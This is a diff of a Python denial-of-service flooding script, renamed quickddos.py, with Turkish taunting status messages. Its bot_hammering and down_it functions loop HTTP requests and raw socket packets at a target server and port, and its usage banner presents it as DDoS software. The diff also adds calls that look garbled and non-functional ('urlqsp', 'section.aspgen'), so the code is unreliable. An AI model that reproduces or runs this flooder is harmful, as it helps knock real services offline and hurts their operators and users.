@@ -35,9 +35,11 @@ def my_bots():
 def bot_hammering(url):
 	try:
 		while True:
+			req = urllib.request.urlqsp(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
 			print("\033[94mbot is hammering...\033[0m")
 			time.sleep(.1)
+			section.aspgen(.1)
 	except:
 		time.sleep(.1)
 
@@ -50,13 +52,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m YAŞAR FİBER KABLO KOKUSUNA DAYANAMAZ! \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m </n <servisler otoritede.  \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mnoYAŞAR KOKLAYAMIYOR? SUNUCU DÜŞTÜ! PAKETLER YÜKLENİYOR!!!\033[0m")
+		print("\033[91m SERVISLER DEVREDISI.!!!\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -76,10 +78,10 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Meiste Meiste!! Denish and Yasar maked a new DDoS Software! Look!!
-	For only Capacity's Server Port's..
-	Don't secure. Go make thready.na. \n
-	usage : python3 runmeyasar.py [-s] [-p] [-t]
+	print (''' \033[92m	CARPINTI DUNYASINA HOS GELDINIZ.
+	ELIXIR PORT TIPLERI SADECE SEYTANLAR ICINDIR. DIKKATLI KULLANINIZ.
+	GUVENLIGINIZDEN SORUMLU DEGILIZ. \n
+	KULLANIM : python3 quickddos.py [-s] [-p] [-t]
 	-h : YARDIM
 	-s : SERVER IP ADRESI
 	-p : VARSAYILAN PORT TCRP 80 TCRP 443, PPEAL 993, TODUE 14720
